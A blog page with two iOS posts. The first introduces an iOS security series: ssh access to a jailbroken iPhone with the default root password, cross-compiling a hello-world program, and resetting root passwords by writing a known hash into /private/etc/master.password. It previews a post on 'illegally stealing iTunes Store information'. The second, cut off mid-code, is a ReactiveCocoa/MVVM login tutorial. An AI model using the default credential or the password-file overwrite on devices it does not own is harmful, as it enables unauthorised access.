              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/iOS/" itemprop="url" rel="index">
                    <span itemprop="name">iOS</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          
             <span id="/2016/07/11/iOS攻防——（一）ssh登陆与交叉编译/" class="leancloud_visitors" data-flag-title="iOS攻防——（一）ssh登陆与交叉编译">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>iOS攻防系列大家耳熟能详的是我们iOS女神念茜的系列文章。博主在看了之后也进行了一系列的学习和尝试。念茜的文章写的比较早，有很多文章中提到的东西已经不再适合现在使用，写的也不算详细，很多地方一笔带过，却不是那么好探索。在中间也有很多摸索的过程。<br>所以本系列文章算是对念茜iOS攻防系列的一个补充，中间细节的地方也会写的更加详尽。</p>
<h1 id="你需要一部越狱手机"><a href="#你需要一部越狱手机" class="headerlink" title="你需要一部越狱手机"></a>你需要一部越狱手机</h1><p>首先要做的事，找一部越狱后的iPhone，攻防方面的探索很多需要借助越狱手机的帮助。作为平常的消遣和研究你也应该有一部越狱手机，我的越狱手机是iPhone4，比较古老，但是研究够用了。</p>
<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>首先是手机（前面说过了）。其次，越狱手机大家都知道一个app——Cydia，在上面可以下载所有的越狱APP，相当于越狱后的app store。对于iOS攻防，首先需要以下软件：</p>
<ol>
<li>openSSH</li>
<li>LLVM+Clang</li>
</ol>
<p>可能还需要的软件：</p>
<ol>
<li>Cydia Translations</li>
<li>Cydia Substrate</li>
<li>Cydia Installer</li>
</ol>
<p>这些软件都可以在Cydia下载到，如果你搜索不到，那么你需要添加一些源<br>在Cydia的软件源中点击『编辑』-&gt;『添加』，依次添加以下源</p>
<blockquote>
<ol>
<li><a href="http://yuan.duowan.com" target="_blank" rel="external">http://yuan.duowan.com</a> - 多玩源</li>
<li><a href="http://apt.thebigboss.org/repofiles/cydia/" target="_blank" rel="external">http://apt.thebigboss.org/repofiles/cydia/</a></li>
</ol>
</blockquote>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91-01.PNG-w375" alt=""><br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91-02.PNG-w375" alt=""><br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91-03.PNG-w375" alt=""></p>
<h1 id="hacking"><a href="#hacking" class="headerlink" title="hacking"></a>hacking</h1><h2 id="1-ssh登陆手机"><a href="#1-ssh登陆手机" class="headerlink" title="1. ssh登陆手机"></a>1. ssh登陆手机</h2><p>ssh登陆，大家应该不算陌生，如果你第一次听说，你可以简单理解成『远程登录』，可以通过一台设备远程登陆另一台设备。</p>
<ol>
<li>保证你的Mac和iPhone在同一网段</li>
<li>确定iPhone的IP</li>
<li>远程登陆</li>
</ol>
<p>在你mac的Terminal输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh root@xxx.xxx.xxx.xxx</div></pre></td></tr></table></figure>
<p>接着会提醒你是否连接，输入yes继续，输入密码，初始密码是<code>alpine</code>。<br>建议你将改密码改掉，因为这样很不安全，在默认密码的情况下，任何人都可以尝试登陆你的设备。<br>在登录之后，你可以更改你的密码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">passwd root</div></pre></td></tr></table></figure>
<p>ssh登陆后，可以试着看看手机的目录结构<br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91-05.png" alt=""></p>
<h2 id="2-交叉编译"><a href="#2-交叉编译" class="headerlink" title="2. 交叉编译"></a>2. 交叉编译</h2><p>首先解释一下什么是交叉编译。交叉编译指在一个平台上生成另一个平台上的可执行代码。<br>我们将会在MAC上写代码，但要生成的可执行文件需要在iPhone上运行。<br>编译是由编译器完成的，所以我们首先要找到合适的编译器。</p>
<p>我们本次的任务就是写一个简单的C程序，能在iPhone上跑的C程序。</p>
<p>念茜所提到的arm-apple-darwin10-llvm-gcc-4.2我是没有找到的，因为这东西好像是在Xcode5的时候才有。</p>
<p>我用的是Clang，所以我们需要下载一下Clang。Clang是一个C语言、C++、Objective-C、C++语言的轻量级编译器。<a href="http://clang.llvm.org/get_started.html" target="_blank" rel="external">这里是传送门</a></p>
<h3 id="1-写经典HelloWorld"><a href="#1-写经典HelloWorld" class="headerlink" title="1. 写经典HelloWorld"></a>1. 写经典HelloWorld</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span>                                                                                               </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;   </div><div class="line">       <span class="built_in">printf</span>(<span class="string">"Hello world !!!\n"</span>);   </div><div class="line">       <span class="keyword">return</span> <span class="number">0</span>;   </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="2-编译"><a href="#2-编译" class="headerlink" title="2. 编译"></a>2. 编译</h3><p>命令台编译：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">touch helloworld.c</div><div class="line">open helloworld.c</div><div class="line">...（写一下代码）</div><div class="line">xcrun -sdk iphoneos clang -arch armv7 -o helloworld helloworld.c</div></pre></td></tr></table></figure>
<p>用过自动打包ipa的同学都对xcrun和xcodebuild很熟悉。这与打包过程类似。</p>
<p>格式：<code>xcrun -sdk iphoneos clang -arch armv7 -o [目标文件名] [源文件名]</code></p>
<p>生成可在iPhone平台运行的二进制可执行文件</p>
<h3 id="3-放到iPhone中"><a href="#3-放到iPhone中" class="headerlink" title="3. 放到iPhone中"></a>3. 放到iPhone中</h3><p>通过ssh文件传输将helloworld传到iPhone中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp helloworld root@192.168.31.152:helloworld</div></pre></td></tr></table></figure>
<p>再看一下iPhone文件目录，是不是已经有了helloworld<br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91-06.png" alt=""></p>
<p>运行一下：<br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91-07.png" alt=""></p>
<p>Bingo！</p>
<p>如果你继续玩，你会发现其实你的iPhone就是一个类Linux系统（本来就是Unix~~），你可以随便玩。</p>
<h1 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h1><h2 id="1-重置ssh登陆密码"><a href="#1-重置ssh登陆密码" class="headerlink" title="1. 重置ssh登陆密码"></a>1. 重置ssh登陆密码</h2><p>如果你不幸忘记了ssh密码，可以在Cydia中下载ifile软件，通过ifile找到/private/etc/master.password文件，文件中会有以下一段：</p>
<blockquote>
<p>root:xxxxxxxxxxxxx:0:0::0:0:System<br>Administrator:/var/root:/bin/sh<br>mobile:xxxxxxxxxxxxx:501:501::0:0:Mobile<br>User:/var/mobile:/bin/sh</p>
</blockquote>
<p>将root:及mobile:后面的13个x字符处修改成<code>/smx7MYTQIi2M</code>，修改后保存此文件，你iphone的ssh密码就重新回到默认的alpine</p>
<h1 id="下期内容"><a href="#下期内容" class="headerlink" title="下期内容"></a>下期内容</h1><p>只是写个HelloWorld是不是很无聊，下一期内容将会教你如何<strong>非法窃取iTunesstore信息</strong>以及<strong>Cycript修改运行时</strong>。</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x63;&#x6f;&#100;&#x65;&#114;&#102;&#x69;&#x73;&#x68;&#x40;&#x31;&#x36;&#x33;&#x2e;&#99;&#111;&#109;">&#x63;&#x6f;&#100;&#x65;&#114;&#102;&#x69;&#x73;&#x68;&#x40;&#x31;&#x36;&#x33;&#x2e;&#99;&#111;&#109;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/05/20/iOS——教你如何使用ReactiveCocoa和MVVM为代码解耦构建清爽APP/" itemprop="url">
                  iOS——教你如何使用ReactiveCocoa和MVVM为代码解耦构建清爽APP
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-05-20T12:39:44+08:00" content="2016-05-20">
              2016-05-20
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/iOS/" itemprop="url" rel="index">
                    <span itemprop="name">iOS</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          
             <span id="/2016/05/20/iOS——教你如何使用ReactiveCocoa和MVVM为代码解耦构建清爽APP/" class="leancloud_visitors" data-flag-title="iOS——教你如何使用ReactiveCocoa和MVVM为代码解耦构建清爽APP">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="1-MVVM简介"><a href="#1-MVVM简介" class="headerlink" title="1. MVVM简介"></a>1. MVVM简介</h1><p>不过多赘述MVC，用最通俗的方式解说MVVM。</p>
<ol>
<li>拆解：<ol>
<li><strong>M：</strong> <code>Model</code> ，包括数据模型、访问数据库的操作和网络请求等</li>
<li><strong>V：</strong> <code>View</code> ，包括了iOS中的 <code>View</code> 和 <code>controller</code> 组成，负责 UI 的展示，绑定 viewModel 中的属性</li>
<li><strong>VM：</strong> <code>ViewModel</code> ，负责从 <code>Model</code> 中获取 <code>View</code> 所需的数据，转换成 <code>View</code> 可以展示的数据，并暴露公开的属性和命令供 <code>View</code> 进行绑定</li>
<li><strong>Binder：</strong>这是我最近发现的，在标准MVVM中没有提到的一部分，但是如果使用MVVM + ReactiveCocoa就会自然地写出这一层。这一层主要为了实现响应式编程的功能，实现 <code>View</code> 和  <code>ViewModel</code> 的同步</li>
</ol>
</li>
<li><p>MVC——&gt;MVVM：</p>
<p> MVC是苹果官方推荐的开发模式，但是伴随这这模式产生的问题非常的多，这是随着项目的逐渐扩大、架构的逐渐复杂显示出来的，这也是为什么MVC也被调侃成<strong>Massive View Controller（重量级视图控制器）</strong>。大多数情况下，小型项目MVC开发不会带来太大的负担，即使你将大量的逻辑代码（不包括通用的工具类逻辑）放在了ViewController中，但只要该部分由一个人维护，相对来说还是可以保持逻辑清晰的。</p>
<p> 但当项目越来越大时，或者一个模块会有多个人维护时，读代码变成了一件非常困难的事，并且，MVC模式的iOS开发一直存在<strong>难以测试</strong>的问题。博主在做JAVA开发时JUnit的测试就像每天的必修课一样。开始iOS开发后，加上第二家公司一直没有QA，线上发现的BUG简直就是每天的噩梦。MVVM带来的好处是 <code>VM</code> 层可以<strong>方便的做测试</strong>，因为 <code>VM</code> 层是<strong>独立的逻辑</strong>，脱离对 <code>View</code> 和 <code>Model</code> 的依赖。</p>
<p> 少写字，多写代码，赶紧进入下一部分介绍，尽快去了解如何编码。</p>
</li>
</ol>
<h1 id="2-ReactiveCocoa"><a href="#2-ReactiveCocoa" class="headerlink" title="2. ReactiveCocoa"></a>2. ReactiveCocoa</h1><h2 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1 简介"></a>2.1 简介</h2><ol>
<li><p><strong>简介：</strong>ReactiveCocoa简称RAC，集合了<strong>函数式编程</strong>和<strong>响应式编程</strong>，这也是为什么ReactiveCocoa被描述为函数响应式编程（FRP）框架。</p>
</li>
<li><p>ReactiveCocoa解决的问题：iOS开发中有多种事件处理方式，相信你一定也曾想过这些坑爹的地方，通常有这些事件处理方式：Action、delegate、Notification、KVO。并且通常这些代码总是散落在代码的各个角落，几度分散。ReactiveCocoa为事件提供了很多处理方法，可以把要处理的事情，和监听的事情的代码放在一起，非常方便管理。</p>
</li>
<li>关于ReactiveCocoa的基本用法，希望你能认真的阅读<a href="http://www.jianshu.com/p/87ef6720a096#" target="_blank" rel="external">这篇博文</a></li>
</ol>
<h2 id="2-2-常用宏"><a href="#2-2-常用宏" class="headerlink" title="2.2 常用宏"></a>2.2 常用宏</h2><ol>
<li><strong><code>RAC(TARGET, [KEYPATH, [NIL_VALUE]])：</code></strong>用于给某个对象的某个属性绑定。</li>
</ol>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 文本框文字改变时修改label的文字</span></div><div class="line">    RAC(<span class="keyword">self</span>.labelView,text) = _textField.rac_textSignal;</div></pre></td></tr></table></figure>
<ol>
<li><code>**RACObserve(self, name)：**</code>监听某个对象的某个属性,返回的是信号，可以用来代替KVO</li>
</ol>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[RACObserve(<span class="keyword">self</span>.view, center) subscribeNext:^(<span class="keyword">id</span> x) &#123;</div><div class="line">        <span class="built_in">NSLog</span>(<span class="string">@"%@"</span>,x);</div><div class="line">&#125;];</div></pre></td></tr></table></figure>
<h1 id="3-实践"><a href="#3-实践" class="headerlink" title="3. 实践"></a>3. 实践</h1><h2 id="3-1-实现内容"><a href="#3-1-实现内容" class="headerlink" title="3.1 实现内容"></a>3.1 实现内容</h2><p>做一个简单的登陆功能，两个输入框，一个登陆按钮。<br>简单的用户名密码验证，要求都在6位数以上即可，不符合要求时禁用登陆按钮。</p>
<h2 id="3-2-Coding"><a href="#3-2-Coding" class="headerlink" title="3.2 Coding"></a>3.2 Coding</h2><h3 id="界面大概是这样的感觉，简单的拉一个即可："><a href="#界面大概是这样的感觉，简单的拉一个即可：" class="headerlink" title="界面大概是这样的感觉，简单的拉一个即可："></a>界面大概是这样的感觉，简单的拉一个即可：</h3><p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8ReactiveCocoa%E5%92%8CMVVM%E4%B8%BA%E4%BB%A3%E7%A0%81%E8%A7%A3%E8%80%A6%E6%9E%84%E5%BB%BA%E6%B8%85%E7%88%BDAPP-01.PNG-w375" alt="禁用登录"><br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8ReactiveCocoa%E5%92%8CMVVM%E4%B8%BA%E4%BB%A3%E7%A0%81%E8%A7%A3%E8%80%A6%E6%9E%84%E5%BB%BA%E6%B8%85%E7%88%BDAPP-01.PNG-w375" alt="启用登录"></p>
<h3 id="M层"><a href="#M层" class="headerlink" title="M层"></a>M层</h3><p>抽出简单的User模型，Thin Model，不包含功能型方法：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;Foundation/Foundation.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">User</span> : <span class="title">NSObject</span></span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSString</span> *username;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSString</span> *password;</div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<h3 id="VM层"><a href="#VM层" class="headerlink" title="VM层"></a>VM层</h3><figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;Foundation/Foundation.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"ReactiveCocoa.h"</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">LoginViewModel</span> : <span class="title">NSObject</span></span></div><div class="line"></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSString</span>   *userName;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSString</span>   *password;</div><div class="line"><span class="comment">// 成功信号</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) RACSubject *successSubject;</div><div class="line"><span class="comment">// 失败信号</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) RACSubject *failureSubject;</div><div class="line"><span class="comment">// 错误信号</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) RACSubject *errorSubject;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> *  按钮是否可点信号</div><div class="line"> *</div><div class="line"> *  @return</div><div class="line"> */</div><div class="line">- (RACSignal *)validSignal;</div><div class="line"><span class="comment">/**</span></div><div class="line"> *  登陆操作</div><div class="line"> */</div><div class="line">- (<span class="keyword">void</span>)login;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<hr>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">"LoginViewModel.h"</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"User.h"</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">LoginViewModel</span> ()</span></div><div class="line"></div><div class="line"><span class="comment">/** 用户名改变信号 */</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) RACSignal *userNameSignal;</div><div class="line"><span class="comment">/** 密码改变信号 */</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) RACSignal *passwordSignal;</div><div class="line"><span class="comment">/** 请求数据（模拟） */</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSArray</span> *requestData;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">LoginViewModel</span></span></div><div class="line"></div><div class="line">- (<span class="keyword">instancetype</span>)init &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">self</span> = [<span class="keyword">super</span> init]) &#123;</div><div class="line">        <span class="comment">// RACObserve(self, name):监听某个对象的某个属性,返回的是信号。</span></div><div class="line">        _userNameSignal = RACObserve(<span class="keyword">self</span>, userName);</div><div class="line">        _passwordSignal = RACObserve(<span class="keyword">self</span>, password);</div><div class="line">        _successSubject = [RACSubject subject];</div><div class="line">        _failureSubject = [RACSubject subject];</div><div class="line">        _errorSubject = [RACSubject subject];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">self</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> *  按钮是否可点信息</div><div class="line"> *</div><div class="line"> *  @return</div><div class="line"> */</div><div class="line">- (RACSignal *)validSignal &#123;</div><div class="line">    RACSignal *validSignal = [RACSignal combineLatest:@[_userNameSignal, _passwordSignal] reduce:^<span class="keyword">id</span>(<span class="built_in">NSString</span> *userName, <span class="built_in">NSString</span> *password)&#123;</div><div class="line">        <span class="comment">// 要求用户名和密码大于6位数</span></div><div class="line">        <span class="keyword">return</span> @(userName.length &gt;= <span class="number">6</span> &amp;&amp; password.length &gt;= <span class="number">6</span>);</div><div class="line">    &#125;];</div><div class="line">    <span class="keyword">return</span> validSignal;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> *  登陆操作</div><div class="line"> */</div><div class="line">- (<span class="keyword">void</span>)login&#123;</div><div class="line">    <span class="comment">// 网络请求进行登录，当然这里只是模拟一下</span></div><div class="line">    User *user = [[User alloc] init];</div><div class="line">    user.username = <span class="keyword">self</span>.userName;</div><div class="line">    user.password = <span class="keyword">self</span>.password;</div><div class="line">    _requestData = @[user];</div><div class="line">    <span class="comment">// 成功发送成功的信号</span></div><div class="line">    [_successSubject sendNext:_requestData];</div><div class="line">    <span class="comment">// 如果失败发送失败的信息号</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<p>通过这一层，你是否发现，VM是可以单独测试的，也是可以单独编写的，即使你没有写 <code>View</code> 层，你可以编写针对VM的Unit进行功能测试，确保VM无误后继续编写后续代码。</p>
<h3 id="V层"><a href="#V层" class="headerlink" title="V层"></a>V层</h3><p>首先我们要通过RAC实现一部分UI的功能——输入文字的时候同步将文字保存起来&amp;&amp;控制按钮的禁用状态。</p>
<p>想想看我们通常是怎么做的？</p>
<ol>
<li>通过实现UITextField的代理</li>
<li>在 <code>- (BOOL)textField:(UITextField *)textField shouldChangeCharactersInRange:(NSRange)range replacementString:(NSString *)string;</code> 方法中获取输入的文字，赋值给username属性和password属性</li>
<li>再判断username和password是否符合要求</li>
<li>再设置按钮的enabled属性</li>
</ol>
<p>是不是看一看就觉得乱糟糟的，按钮的addTarget在一个地方，代理又在一个地方，再加上判断用户名密码合法逻辑单独抽出的方法。OMG。</p>
<p>ReactiveCocoa是怎么做的？</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">RAC(<span class="keyword">self</span>.viewModel, userName) = <span class="keyword">self</span>.tfUserName.rac_textSignal;</div><div class="line">RAC(<span class="keyword">self</span>.viewModel, password) = <span class="keyword">self</span>.tfPassword.rac_textSignal;</div><div class="line">RAC(<span class="keyword">self</span>.btLogin, enabled) = [<span class="keyword">self</span>.viewModel validSignal];</div></pre></td></tr></table></figure>
<p>三句话，清清爽爽。</p>
<p>再加上 <code>ViewModel</code> 的信号绑定，将上面的代码放到一个方法中，命名为<code>bindModel</code></p>
<p>最后的代码如下：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">"ViewController.h"</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"ReactiveCocoa.h"</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"LoginViewModel.h"</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"User.h"</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">ViewController</span> ()</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) LoginViewModel *viewModel;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">weak</span>, <span class="keyword">nonatomic</span>  ) <span class="keyword">IBOutlet</span> <span class="built_in">UITextField</span>    *tfUserName;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">weak</span>, <span class="keyword">nonatomic</span>  ) <span class="keyword">IBOutlet</span> <span class="built_in">UITextField</span>    *tfPassword;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">weak</span>, <span class="keyword">nonatomic</span>  ) <span class="keyword">IBOutlet</span> <span class="built_in">UIButton</span>       *btLogin;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">ViewController</span></span></div><div class="line"></div><div class="line">- (<span class="keyword">void</span>)viewDidLoad &#123;</div><div class="line">    [<span class="keyword">super</span> viewDidLoad];</div><div class="line">    [<span class="keyword">self</span> bindModel];</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> *  绑定Model中的各种事件</div><div class="line"> */</div><div class="line">- (<span class="keyword">void</span>)bindModel &#123;</div><div class="line">    <span class="keyword">self</span>.viewModel = [[LoginViewModel alloc] init];</div><div class="line">    RAC(<span class="keyword">self</span>.viewModel, userName) = <span class="keyword">self</span>.tfUserName.rac_textSignal;</div><div class="line">    RAC(<span class="keyword">self</span>.viewModel, password) = <span class="keyword">self</span>.tfPassword.rac_textSignal;</div><div class="line">    RAC(<span class="keyword">self</span>.btLogin, enabled) = [<span class="keyword">self</span>.viewModel validSignal];</div><div 